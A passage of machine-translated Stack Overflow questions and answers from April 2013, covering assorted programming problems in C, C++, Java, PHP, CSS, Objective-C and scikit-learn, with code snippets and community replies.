如果您担心性能，请不要在循环中使用 array.length。这不是一个值，是一个内部函数，每次访问都会重新计算数组的总项目，更好的是：

```
var total = items.length;
for(i=0; i < total; i++){
   //stuff
} 
```

现在对于您的特定用例，我不知道您正在使用的框架，但是如果您使用的是 jQuery 和/或下划线，而不是循环，您可以使用其中一个映射函数： [http://api. jquery.com/jQuery.map/](http://api.jquery.com/jQuery.map/) [http://underscorejs.org/#map](http://underscorejs.org/#map)

# drupal - 文本在 Drupal Tweme 中跨越页面宽度

> ID：16122310
> 
> 赞同：0
> 
> 时间：2013-04-20T15:58:49.087
> 
> 标签：drupal

我使用过其他内容管理系统，但最近切换到 Drupal。我正在使用 Drupal 7 构建一个带有 Tweme 响应模板的网站，但问题是：文本跨越网站的页面宽度而没有停止。我的意思是文本没有向下流动，而是在页面宽度上无休止地运行。

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T18:59:08.000

div宽度有问题。

做一件事，将内容放在文本中并检查是否有效。

示例代码将有助于查明问题。

# c - 使用指针向结构成员输入值

> ID：16122312
> 
> 赞同：0
> 
> 时间：2013-04-20T15:59:07.430
> 
> 标签：c, pointers, syntax, structure

我正在编写一个程序，用于使用结构和指针查找两个有理数的加法、乘法和除法。我在用指针输入数字时遇到问题。我的代码应该如何更正？谢谢！

```
#include <stdio.h>
struct rational
{
    int nu;
    int de;
}*p1,*p2,*p3;
void add()
{
    p1->nu = p1->nu*p2->de + p1->de*p2->nu;
    p3->de = p1->de * p2->de;
    printf("%d\n--\n%d\n",p3->nu,p3->de);
}
void multiply()
{
    p3->nu = p1->nu * p2->nu;
    p3->de = p1->de * p2->de;
    printf("%d\n--\n%d\n",p3->nu,p3->de);
}
void divide()
{
    p3->nu = p1->nu * p2->de;
    p3->de = p1->de * p2->nu;
    printf("%d\n--\n%d\n",p3->nu,p3->de);
}
int main()
{
    int a,b,c,d,choice;
    printf("Enter the first rational number.\n");
    scanf("%d%d",&a,&b);
    p1->nu = a;
    p1->de = b;
    printf("Enter the second rational number.\n");
    scanf("%d%d",&c,&d);
    p2->nu = c;
    p2->de = d;
    scanf("%d",&choice);
    switch (choice)
    {
        case 1: add();
                break;
        case 2: multiply();
                break;
        case 3: divide();
                break;
    }
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:25:18.117

例如

```
#include <stdio.h>
#include <stdlib.h>

struct rational{
    int nu;
    int de;
} ;

int main(void){
    int n, d;
    struct rational *p;

    p=(struct rational*)malloc(sizeof(struct rational));
    printf("Enter the rational number.\n");
/*  Indirection
    scanf("%d/%d", &n, &d);
    p->nu = n;
    p->de = d;
*/
scanf("%d/%d", &p->nu, &p->de);//Direct
    printf("%d/%d\n", p->nu, p->de);
    return 0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T16:01:30.673

您从不初始化指针，因此您提供的代码会调用**未定义的行为**。在实际使用 p1 之前，p2 和 p3 让它们指向某个现有对象，或者动态地为它们分配内存。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T19:29:28.067

解决了。我声明了 3 个`struct rational`变量`p1`：`p2`和`p3`在`main()`. 然后我将这些变量的地址导出到具有三个指针作为原型的函数中。

```
#include <stdio.h>  
struct rational
{
    int nu;
    int de;
};
void add(struct rational *p1,struct rational *p2,struct rational *p3)
{
    p3->nu = (p1->nu)*(p2->de) + (p1->de)*(p2->nu);
    p3->de = p1->de * p2->de;
    printf("%d\n-\n%d\n",p3->nu,p3->de);
}
void multiply(struct rational *p1,struct rational *p2,struct rational *p3)
{
    p3->nu = p1->nu * p2->nu;
    p3->de = p1->de * p2->de;
    printf("%d\n-\n%d\n",p3->nu,p3->de);
}
void divide(struct rational *p1,struct rational *p2,struct rational *p3)
{
    p3->nu = p1->nu * p2->de;
    p3->de = p1->de * p2->nu;
    printf("%d\n-\n%d\n",p3->nu,p3->de);
}
int main()
{
    struct rational p1,p2,p3;

    int a,b,c,d,choice;
    printf("Enter the first rational number.\n");
    scanf("%d/%d", &p1.nu, &p1.de);
    printf("Enter the second rational number.\n");
    scanf("%d/%d", &p2.nu, &p2.de);
    printf("1\. Addition 2\. Multiplication 3\. Division: ");
    scanf("%d",&choice);
    switch (choice)
    {
        case 1: add(&p1,&p2,&p3);
                break;
        case 2: multiply(&p1,&p2,&p3);
                break;
        case 3: divide(&p1,&p2,&p3);
                break;
    }
    return 0;
}
//Output
//Enter the first rational number.
//3/4
//Enter the second rational number.
//7/9
//1\. Addition 2\. Multiplication 3\. Division: 1
//55
//-
//36 
```

# javascript - 放大CSS HTML时如何阻止DIV粘在页面左侧

> ID：16122314
> 
> 赞同：1
> 
> 时间：2013-04-20T15:59:15.853
> 
> 标签：javascript, jquery, html, css

**设想**

我的网站上有一个宽度为 2000 像素的横幅，当我放大整个横幅时，它会粘在该页面的左侧。

**问题**

我希望它保持原样，如果用户放大太多，它将离开页面。[与此站点横幅](http://goo.gl/CYnBE)相同的方式

**例子**

我在横幅中有一个 2000 像素的图像，图像的主要部分位于中心，宽度为 1000 像素。如果放大图像移动并且图像的中心向右移动。

**这是我的实时代码：[站点示例](http://goo.gl/SsxDy)**

这是我的 CSS：

```
 #slideshow { 
    margin: 0 auto; 
    position: relative; 
    left:0px;
    width: 2000px; 
    height: 400px; 
    box-shadow: 0 0 20px rgba(0,0,0,0.4); 
    display:block;
    text-align:center;
    float: none;
}
#slideshow img {
   margin: 0 auto;
   text-align:center; 
}
#slideshow > div { 
    position: absolute; 
}
#banner {
    background: #EAEAEA;
    border-top: 1px solid #CCC;
    border-bottom: 1px solid #CCC;
    width: 100%;
    position: absolute;
    left: 0px;
    overflow-x: hidden;
    top: 180px;
} 
```

这是我的 HTML：

```
 <div id="banner">
    <div id="slideshow">
      <div><a href="#"><img src="AG/images/bulbs.png"></a></div>
      <div><img src="AG/images/cables.png"></div>
   </div>
</div> 
```

我还在学习，所以我感谢你的帮助：D

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T16:09:20.473

使位置相对，并在要移动横幅的方向上添加一些填充。

# c++ - 类似容器的 C++ multimap 对键的一部分执行搜索

> ID：16122317
> 
> 赞同：1
> 
> 时间：2013-04-20T15:59:36.680
> 
> 标签：c++, containers, multimap

我想将数据存储在某种键（一些位数组）-> 值（整数）映射容器中。Bitarray 最大可以达到 32 字节（并且可能是一个恒定的大小）。

当然，它可以是标准的 std::multimap。

> std::multimap my_map;

但我还必须搜索密钥的一部分（几个位置上的 1 或 0 位），而不关心它的其余部分。例如：

插入地图：

*   键 b“1010001”下的值 1，
*   键 b“1010001”下的值 2，
*   键 b“1000001”下的值 3
*   键 b“0000001”下的值 4

然后我应该收到值：

*   1、2、3 和 4 如果我寻找 b"0000001"，
*   1、2 和 3 如果我寻找 b"1000000"，
*   1和2如果我寻找b“1010001”

拥有精确匹配键值的能力也是一件好事。

如何在 boost 支持的 C++ 中以最简单（但仍然有效）的方式实现它？我关心性能（可能有数百万个键）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:19:48.470

最好使用[前缀树](http://en.wikipedia.org/wiki/Prefix_tree)。您可以轻松地修改实现以满足您只关心密钥的某些部分的需要。此外，搜索时间非常快。

对于您的示例，树的高度为 8，如果键中的当前位为 0，您将探索左子树，如果它是 1，则探索右子树。您可以修改实现以不关心零并通过在您尝试与搜索键中的 0 匹配的每个点进行分支（探索左子树和右子树）返回所有结果。

![前缀树](https://upload.wikimedia.org/wikipedia/commons/b/be/Trie_example.svg)

# machine-learning - 如何在 RandomForestRegressor (scikit-learn) 中获取所有集成估计

> ID：16122320
> 
> 赞同：1
> 
> 时间：2013-04-20T16:00:16.063
> 
> 标签：machine-learning, scikit-learn, random-forest, ensemble-learning

我正在尝试拟合随机森林回归，我想通过查看集合中每个回归树的输出来获得我的估计分布，并以某种列表形式返回给我。在 R 中，`predict.all`在预测方法中提供选项`randomForest`对​​我来说是这样做的，有没有办法`RandomForestRegressor`在 sklearn 的类中做到这一点？

在 0.13 及更高版本中，我看到了 apply 返回叶索引的方法，但是我不确定如何使用这些，并且我在`RandomForestRegressor`.

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T20:38:49.380

你能升级到0.14吗？在 0.14 中，有一个 estimators_ 成员可以让您访问各个树。请参阅[RandomForestRegressor](http://scikit-learn.org/0.13/modules/generated/sklearn.ensemble.RandomForestRegressor.html#sklearn.ensemble.RandomForestRegressor.get_params)文档。

# java - readObject() 不工作并从方法中断

> ID：16122321
> 
> 赞同：1
> 
> 时间：2013-04-20T16:00:21.473
> 
> 标签：java, object, serialization

我想从 file 读取不同类型的对象到 an `ArrayList`，它们都是类的实例，它们扩展了类 Advertisement。我正在尝试使用此代码：

```
ArrayList <Advertisement> ads = new ArrayList<Advertisement>();
ObjectInput input2 = new ObjectInputStream(
    new BufferedInputStream(new FileInputStream("ads.ser")));

//break from this method at this point
ads = (ArrayList<Advertisement>) input2.readObject(); 
```

问题出在第三行/最后一行。它不会读取`ads`类型变量中 的对象`ArrayList<Advertisement>`，此外，它会从这个方法中中断，没有任何消息。

编辑：删除了 try-catch 块，我应该早点完成，但我仍然不知道解决方案。堆栈跟踪：

```
java.io.InvalidClassException: Kiado; local class incompatible: stream classdesc serialVersionUID = -1393576200767336208, local class serialVersionUID = -841663850423605586
    at java.io.ObjectStreamClass.initNonProxy(Unknown Source)
    at java.io.ObjectInputStream.readNonProxyDesc(Unknown Source)
    at java.io.ObjectInputStream.readClassDesc(Unknown Source)
    at java.io.ObjectInputStream.readOrdinaryObject(Unknown Source)
    at java.io.ObjectInputStream.readObject0(Unknown Source)
    at java.io.ObjectInputStream.readObject(Unknown Source)
    at java.util.ArrayList.readObject(Unknown Source)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at java.io.ObjectStreamClass.invokeReadObject(Unknown Source)
    at java.io.ObjectInputStream.readSerialData(Unknown Source)
    at java.io.ObjectInputStream.readOrdinaryObject(Unknown Source)
    at java.io.ObjectInputStream.readObject0(Unknown Source)
    at java.io.ObjectInputStream.readObject(Unknown Source)
    at Main.beolvasas(Main.java:30)
    at Main.startup(Main.java:57)
    at Main.main(Main.java:633) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:56:16.787

既然您有了堆栈跟踪，问题就很清楚了：从将对象序列化到文件的那一刻起，您已经对 class 进行了更改`Kiado`。因此，您现在拥有的类不再与将对象序列化到文件时的类兼容。

如果您没有更改类（及其所有超类）字段的编号和名称，则只需在类中添加以下变量声明即可使其再次兼容：

```
private static final long serialVersionUID = -1393576200767336208; 
```

如果您添加、删除或重命名了至少一个（非瞬态）字段，那么您可能会使新类仍然与旧类兼容，但会带来更多痛苦。我们必须了解这些变化的性质才能为您提供帮助。

我个人会避免将本机序列化用于长期存储，因为正如您刚刚注意到的那样，它很脆弱并且很难更改模型。我会使用更易于阅读和迁移的文件格式：例如 XML 或 JSON。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:10:28.877

你有没有类似的代码：

```
catch(<WheteverException> e)
{
   // nothing here
} 
```

如果是这样，请执行以下操作：

1.  更改`// nothing here`为`e.printStackTrace();`
2.  删除 try/catch 并仅在编译器告诉您添加时将其添加回来，然后仅添加编译器告诉您添加的异常（例如，不要执行`catch(Exception e)`.

# php - 接口在框架中的位置

> ID：16122322
> 
> 赞同：0
> 
> 时间：2013-04-20T16:00:24.990
> 
> 标签：php, oop, language-agnostic, interface

假设您有一个包含 2 个组件的框架，这些组件位于不同的文件夹和命名空间中。您希望将它们解耦到一个级别，每个级别都可以单独使用。

第一个类提供了一定的功能，比如将消息写入日志文件：

```
<?php
namespace \Sample\Log;

class Logger impements LoggerInterface {
public function log($message) { //Write message into log file } } 
```

第二个类还提供了框架功能，但也应该能够使用提供的类编写日志消息。

```
namespace \Sample\Config;

    class Config
    {

    protected $logger;

    public function setLogger(LoggerInterface $logger)
    {
    $this->logger=$logger
    }

    public function loadConfig(){
    include('config.php')
    $this->logger->log('Config file loaded!');
    }

    } 
```

接口应该放在哪里以允许框架用户只使用配置类？它们应该在 Sample/Interfaces/、Sample/Logger/、Sample/Config/ 还是其他地方？我提供的所有三个选项都有一定的优点和缺点，所以我不确定我应该把它放在哪里。

```
<?php

interface LoggerInterface
{
public function log($message);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T21:19:32.580

`Sample/Interfaces`如果有很多我会去。如果没有，`Samples/Shared`例如。但这实际上更多是一种偏好或设计决定，而不是规则或其他东西。含义：由你决定。

但是，为了记录，有一个标准的记录器接口已被 php 框架社区接受：

[https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-3-logger-interface.md](https://github.com/php-fig/fig-standards/blob/master/accepted/PSR-3-logger-interface.md)

如果你正在编写一个框架，你真的应该看看所有公认的标准。第一个（psr0）实际上是强制性的。我猜你已经在关注它了。

# wif - expiryTime 应该如何与 SessionSecurityTokenCache.AddOrUpdate() 一起使用？

> ID：16122332
> 
> 赞同：2
> 
> 时间：2013-04-20T16:01:24.550
> 
> 标签：wif, claims-based-identity

我正在编写一个自定义实现，[`SessionSecurityTokenCache`](http://msdn.microsoft.com/en-us/library/hh159403.aspx)我对[AddOrUpdate](http://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.sessionsecuritytokencache.addorupdate.aspx)方法`expiryTime`中的目的是什么感到有些困惑。

据我所知，`SessionSecurityTokenCache`WIF 使用的默认实现是内部类（在[此处](http://msdn.microsoft.com/en-us/library/hh545457.aspx)`MruSessionSecurityTokenCache`提到）。在它的实现中，完全被忽略了。 `expiryTime`

另外，我在调试时注意到传入的值`AddOrUpdate`似乎总是[`token.ValidTo`](http://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.sessionsecuritytoken.validto.aspx)加 5 分钟，因此有某种意图以某种方式使用该值。

几个问题：

*   该值的预期策略是什么？

    *   偶尔的缓存清理？
    *   `Get()`和`GetAll()`方法是否应该`SessionSecurityTokenCache`过滤掉过期的令牌？
*   在任何这些情况下，为什么不直接使用`SessionSecurityToken.ValidTo`（或从中抵消）？

# html - CSS 浮动文本栏

> ID：16122334
> 
> 赞同：2
> 
> 时间：2013-04-20T16:01:45.500
> 
> 标签：html, css

我有这个 HTML 代码：

```
<div id="navbar">
    <ul>
        <li><a href="#">Home</a></li>
        <li><a href="#">Forum</a></li>
        <li><a href="#">Contact Us</a></li>
    </ul>
</div> 
```

CSS：

```
#navbar { position: relative; margin: 3px; }
#navbar ul { padding: 0; margin: auto; background: #f0f0f0 url(../images/1px.png) repeat-x 0 -441px; padding: 4px 0 4px 0; }
#navbar li { display: inline; margin-right: 80px; }
#navbar li a { font-family: EqualSansDemo; font-size: 1.6em; color: #555555; text-shadow: 1px 1px 0px #fff; }   
#navbar li a:hover { color: #0071e4; } 
```

它会是这样的： ![在此处输入图像描述](https://i.stack.imgur.com/pdHeg.gif)

我需要做的就是：

![在此处输入图像描述](https://i.stack.imgur.com/l5Zsh.gif)

我真的尝试了很多东西，浪费了三个小时没有任何成功......我认为这很容易，但我不擅长 CSS。请问有什么想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-20T16:13:26.043

你想要的是`Suckerfish Dropdown`你必须做的是：

```
<ul>
    <li>Home</li>
    <li>Forum
        <ul class="children">
            <li>Some link</li>
            <li>Another link</li>
        </ul>
    </li>
    <li>Contact Us</li>
</ul> 
```

默认情况下当然不应该显示孩子，所以在你的 CSS 中添加：

```
.children{display:none;} 
```

当论坛元素悬停时，您应该显示它们，所以：

```
li:hover .children{display:block;} 
```

当然，您需要添加一些位置样式，以便它们很好地位于论坛元素下方，并且不会破坏您的设计。因此，请确保您将儿童课程排除在外`position:absolute;`

您可以在此处阅读有关吸盘鱼下拉菜单的更多信息：http: [//alistapart.com/article/dropdowns](http://alistapart.com/article/dropdowns)

# mysql - 将 SugarCRM 帐户和联系人导入 mysql for Joomla

> ID：16122335
> 
> 赞同：-1
> 
> 时间：2013-04-20T16:01:47.177
> 
> 标签：mysql, joomla, sugarcrm

我对 Joomla 网站开发非常了解，但 SugarCRM 实际上一点也不了解。我让我的朋友使用托管的 SugarCRM Professional，将她的 300 个帐户中的选定字段手动导出到 Excel 电子表格，并将她的 900 个联系人中的选定字段手动导出到另一个 Excel 电子表格。使用 phpmyadmin 我将 excel 电子表格导入到我的 Joomla mysql 数据库中。然后我编写了一些模块来显示她的 Joomla 网站上的帐户和联系人。

我的问题是，我想通过一些简单的步骤，让她可以随时从 Sugar 刷新 Joomla 网站。Sugar Professional 可以绕过 Excel 导出到 mysql 吗？可以将Sugar Professional 导出到SugarCRM 的社区版本——因为我可以用我的Joomla 来托管它，并且可能直接进入表格中——唯一的事情是我不想从她的Professional Sugar 表格中复制与财务相关的数据字段。专业的 SugarCRM 开发人员会使用哪些技术？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T16:12:40.253

有一些解决方案可能已经为您做到了。查看[https://www.sugaroutfitters.com/addons/sugarycb](https://www.sugaroutfitters.com/addons/sugarycb)了解其中之一。可以节省大量时间/麻烦。

# php - 登录/注销动态

> ID：16122336
> 
> 赞同：1
> 
> 时间：2013-04-20T16:01:51.510
> 
> 标签：php, dynamic, login, logout

```
 if(isset($_SESSION['username'])) {
echo "Logout";
} else {
echo "Login";
}
?> 
```

我需要这样的东西，我适应了这个 bur 仍然无法工作......

```
 <?php
if(isset($_SESSION['username'])) {
<p>Ola; <u><?php echo $_SESSION['username']; ?></u>, </p>
<p><a href="logout.php">Logout</a></p>;
}
else {
<p><a href="#login-box" class="login-window">Login</a></p>;
}
?> 
```

我应该把它放在一个单独的 frok html 代码中并包含它吗？请帮帮我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T17:06:56.567

我不知道您想说什么以及您的实际问题是什么..但我已经检查了给定的网址，据我了解，此代码可能对您有用..

```
 <?php if(isset($_SESSION['username'])){ ?>
    <p>Ola; <u><?php echo $_SESSION['username']; ?></u>, </p>
    <p><a href="logout.php">Logout</a></p>
<?php } else{ ?>
    <p><a href="#login-box" class="login-window">Login</a></p>
<?php } ?> 
```

谢谢...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:19:48.087

我不太明白你的问题，但我可以看到你的代码有一些问题。试试下面的。

```
<?php if(isset($_SESSION['username'])): ?>
    <p>Ola; <u><?php echo $_SESSION['username']; ?></u>, </p>
    <p><a href="logout.php">Logout</a></p>
<?php else: ?>
    <p><a href="#login-box" class="login-window">Login</a></p>
<?php endif ?> 
```

# c++ - 用新定义的数组大小？

> ID：16122337
> 
> 赞同：2
> 
> 时间：2013-04-20T16:01:55.060
> 
> 标签：c++, arrays, new-operator, sizeof

是否有一个函数（可以编写）可以知道用 new 定义的数组的大小：

```
 int *a=new int[3];
  *a=4;
  *(a+1)=5;
  *(a+2)=6; 
```

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-20T16:04:19.997

没有一种标准的方法来获取分配给 的数组的大小`new`。

数组分配的更好方法是`std::vector`，它确实有一个`size()`成员 - 当它超出范围时它会自动清理。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-20T16:04:23.877

简短的回答：**不**。

改为使用`std::vector`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T17:40:01.567

可以为此编写一个函数。但在现实世界中，这是一个糟糕的主意。

尽管调用的行为`new`很可能存储了分配的数组中的元素数量（或至少存储了它下面的实际分配的大小），但您无法以不依赖于了解`new`您的特定系统是如何工作的，如果您以不同的方式编译代码（例如代码的调试或发布版本）、更改编译器（或运行时库）的版本等，这可能会改变。

使用`std::vector`上述方法是一种更好的方法，因为您也不必担心在其他地方释放您的阵列。

如果出于某种原因，您不想 [或您的导师告诉您，您不能] 使用`std::vector`，您需要“记住”分配的大小。

# html - iframe 的滚动：背景不渲染

> ID：16122338
> 
> 赞同：1
> 
> 时间：2013-04-20T16:01:56.570
> 
> 标签：html, css, iframe

我必须在`iframe`. 宽度比较小`iframe's`（约400px），无法更改。问题是当我`iframe`水平滚动时，我可以看到包含页面的背景没有被绘制。但是有些页面可以正常呈现。

重现的代码非常简单：

```
<iframe src="http://ubuntu.com"></iframe>  
<iframe src="http://britannica.com"></iframe>  
<iframe src="http://linktiger.com"></iframe>  
<iframe src="http://youtown.com"></iframe>  
<iframe src="http://pagefreezer.com"></iframe>  <!-- ok -->  
<iframe src="http://imdb.com"></iframe>    <!-- ok --> 
```

一图抵千言：http: [//jsfiddle.net/rKfNA/3/](http://jsfiddle.net/rKfNA/3/)

这些页面的背景是使用普通的`background`css 属性指定的。

我已经在ubuntu，android和windows下的所有主要浏览器中重现了这一点。

为什么`iframe`没有正确显示它们？这是渲染引擎的错误吗？还是这是“设计使然”？我该怎么做才能在 iframe 中显示内容？
你能帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T16:11:22.803

背景设置在身体上。body 是 iframe 的高度和宽度。

这是该网站的开发人员制造的错误。你可以`iframe`在一个`div`. iframe**恰好**需要是您正在显示的网站的宽度和高度。*没有其他办法。*

示例： http: [//jsfiddle.net/rKfNA/4/](http://jsfiddle.net/rKfNA/4/)（iframe的宽高不是里面网站的宽高，所以有双滚动条）

# google-chrome - 溢出：使用 Flexbox 自动导致垂直居中的项目被切断

> ID：16122341
> 
> 赞同：6
> 
> 时间：2013-04-20T16:02:12.747
> 
> 标签：google-chrome, webkit, flexbox

第一个链接是 flexbox 2009 模型：

[http://jsfiddle.net/vLKBV/](http://jsfiddle.net/vLKBV/)

```
<div style="display:-webkit-box;height:100%">
<div style="background:#f00;width:50px">
</div>
<div style="display:-webkit-box;-webkit-box-align:center;-webkit-box-pack:center;background:#0f0;-webkit-box-flex:1;overflow-Y:scroll">
    <div style="background:#000;width:10px;height:300px">
        HELLO
    </div>
</div>
<div style="background:#f00;width:50px">
</div> 
```

第二个是修订后的 2011 - 2012 版本：

[http://jsfiddle.net/MNRgT/1/](http://jsfiddle.net/MNRgT/1/)

```
<div style="display:-webkit-flex;height:100%">
<div style="background:#f00;width:50px">
</div>
<div style="display:-webkit-flex;-webkit-align-items:center;-webkit-justify-content:center;background:#0f0;-webkit-flex:1;overflow-Y:scroll">
    <div style="background:#000;width:10px;height:300px">
        HELLO
    </div>
</div>
<div style="background:#f00;width:50px">
</div> 
```

如果您垂直调整结果大小，您将看到“HELLO”在较新的 flex 模型中消失，如果您向下滚动，它会给您一个底部空白区域。另一方面，较旧的 flex 模型表现正确。

最新的 Chrome v26.0.1410.65 有什么办法解决这个问题吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-21T01:17:32.973

不幸的是，2009 年和 2012 年规范之间的差异不仅仅涉及不同的属性名称。实施不完整的草稿始终是一场赌博，因此假设遵循较新规范的浏览器具有正确行为（即使它不是您想要的行为）总是更安全。

Flexbox 的美妙之处在于它提供了许多不同的方法来实现特定的布局。Flexbox 的一个被低估的特性是，*auto*的值用于顶部和底部边距确实做到了它听起来的样子，它正是您在这里需要的，而不是 justify-contents/align-items。

[http://codepen.io/cimmanon/pen/DEnHh](http://codepen.io/cimmanon/pen/DEnHh)

```
html, body {
  background: #000;
  width: 100%;
  height: 100%;
  margin: 0;
}

div.container {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flexbox;
  display: -ms-flexbox;
  display: -webkit-flex;
  display: flex;
  height: 100%;
}

div.side {
  background: #F00;
  width: 50px;
}

div.center {
  display: -webkit-box;
  display: -moz-box;
  display: -webkit-flexbox;
  display: -ms-flexbox;
  display: -webkit-flex;
  display: flex;
  -webkit-box-align: center;
  -moz-box-align: center;
  -webkit-box-pack: center;
  -moz-box-pack: center;
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1;
  -ms-flex: 1;
  flex: 1;
  overflow-Y: scroll;
  background: #0f0;
}

div.child {
  margin: auto;
  background: white;
  width: 10em;
}

<div class="container">
  <div class="side"></div>
  <div class="center">
    <div class="child">
        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus porta elit vel ante hendrerit facilisis. Curabitur aliquam sollicitudin diam, id posuere elit consectetur nec.
    </div>
  </div>
  <div class="side"></div>
</div> 
```

# php - PHP试图在文本文件中找到一个特定的行并回显它

> ID：16122345
> 
> 赞同：3
> 
> 时间：2013-04-20T16:02:29.230
> 
> 标签：php, parsing

所以我试图在一个抓取的 html 文件中找到一个蒸汽 ID 的列表。这是我到目前为止所拥有的，但它不起作用，它正在解析一个我保存为文本的 html 页面，并且应该输出带有以下变量的内容，它正在输出一个空白页面。

```
 <?php
$filein = file('TF2U.txt');
foreach ($filein as $html) {
    $pattern = '#.*<a[^>]+href="steamcommunity.com/profiles/([0-9]+)/"#iA';
    $matches = NULL;
    $match_count = preg_match_all($pattern, $html, $matches);
    if ($match_count > 0) {
        echo implode($matches[1]);
        echo "<br>\n";
        }
}
?> 
```

任何帮助都会很棒，我不确定我错过了什么，但这可能很简单。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T22:44:13.843

问题是链接不以 a 结尾`/`，所以这里有一些调整的解决方案：

```
$file = file_get_contents('TF2U.htm');
preg_match_all('#<a.*?href="(?:http://)steamcommunity.com/profiles/(?P<id>\d+)[^‌​&gt;]+#msi', $file, $matches);
print_r($matches['id']); 
```

# objective-c - 弱属性在 dealloc 中设置为 nil 但属性的 ivar 不是 nil

> ID：16122347
> 
> 赞同：13
> 
> 时间：2013-04-20T16:02:32.413
> 
> 标签：objective-c, automatic-ref-counting, weak-references

我在启用 ARC 的 Objective-C 中注意到以下内容：

让我们有简单的 A 类和自动合成的弱属性

```
@interface A
@property (nonatomic, weak) id refObject;
@end

@implementation A
@end 
```

和实现了dealloc的第二类B

```
@interface B
@end

@implementation B
-(void) dealloc
{
    NSLog(@"In dealloc");
}
@end 
```

最后在 A 类的某个地方有以下内容：

```
@implementation A
...
-(void) foo
{
   B* b = [B new];
   self.refObject = b;
   // Just use b after the weak assignment
   // in order to not dealloc 'b' before assignement 
   NSLog(@"%@", b);
}
...
@end 
```

如果我在其中设置断点`[B dealloc]`并检查`[A refObject]`属性，我可以看到它`a.refObject`是 nil 但`a->_refObject`不是 nil 并指向'b'

任何想法为什么会发生这种情况？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-04-20T18:44:08.727

**简短**的回答：实例变量`a->_refObject`（还）不是 nil in `-[B dealloc]`，但是每次访问该弱指针都是通过一个 ARC 运行时函数完成的，如果释放已经开始，则返回 nil 。

**长答案：**通过设置观察点，您可以看到`a->_refObject`在解除分配过程结束时将其设置为 nil。堆栈回溯（当观察点被命中时）如下所示：

```
frame #0: 0x00007fff8ab9f0f8 libobjc.A.dylib`arr_clear_deallocating + 83
frame #1: 0x00007fff8ab889ee libobjc.A.dylib`objc_clear_deallocating + 151
frame #2: 0x00007fff8ab88940 libobjc.A.dylib`objc_destructInstance + 121
frame #3: 0x00007fff8ab88fa0 libobjc.A.dylib`object_dispose + 22
frame #4: 0x0000000100000b27 weakdealloc`-[B dealloc](self=0x000000010010a640, _cmd=0x00007fff887f807b) + 151 at main.m:28
frame #5: 0x0000000100000bbc weakdealloc`-[A foo](self=0x0000000100108290, _cmd=0x0000000100000e6f) + 140 at main.m:41
frame #6: 0x0000000100000cf5 weakdealloc`main(argc=1, argv=0x00007fff5fbff968) + 117 at main.m:52
frame #7: 0x00007fff8c0987e1 libdyld.dylib`start + 1 
```

并被`object_dispose()`调用`-[NSObject dealloc]`（可以在 [http://www.opensource.apple.com/source/objc4/objc4-532/runtime/NSObject.mm](http://www.opensource.apple.com/source/objc4/objc4-532/runtime/NSObject.mm)中看到）。

因此 in `-[B dealloc]`,在调用`a->_refObject`（编译器生成）之前不是 nil 。`[super dealloc]`

所以问题仍然存在：为什么`a.refObject`此时返回 nil ？

原因是每次访问弱指针，ARC 编译器都会调用`objc_loadWeak()`or `objc_loadWeakRetained()`。从[文档](http://clang.llvm.org/docs/AutomaticReferenceCounting.html#arc-runtime-objc-loadweakretained)中：

> **id objc_loadWeakRetained(id *object)**
> 
> 如果 object 注册为 __weak 对象，并且存储在 object 中的最后一个值尚未被释放或开始释放，则保留该值并返回它。否则 > 返回 null。

因此，即使`a->refObject`此时不是 nil，通过`objc_loadWeakRetained()`（通过属性访问器方法完成）访问弱指针也会返回 nil，因为`B`对象的释放已经开始。

调试器`a->refObject`直接访问，不调用`objc_loadWeak()`.

# php - 未找到 PHP 扩展

> ID：16122348
> 
> 赞同：2
> 
> 时间：2013-04-20T16:02:32.660
> 
> 标签：php, php-extension

我已经使用与 5.4.13 版本相同的配置在 linux 系统上编译了 5.4.14 版本的 PHP。我运行以下 PHP -i 命令并得到：

```
[root@localhost php-5.4.14]# php -i
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib64/20100525/fileinfo.so' - /usr/lib64/20100525/fileinfo.so: cannot open shared object file: No such file or directory in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib64/20100525/json.so' - /usr/lib64/20100525/json.so: cannot open shared object file: No such file or directory in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib64/20100525/phar.so' - /usr/lib64/20100525/phar.so: cannot open shared object file: No such file or directory in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib64/20100525/zip.so' - /usr/lib64/20100525/zip.so: cannot open shared object file: No such file or directory in Unknown on line 0 
```

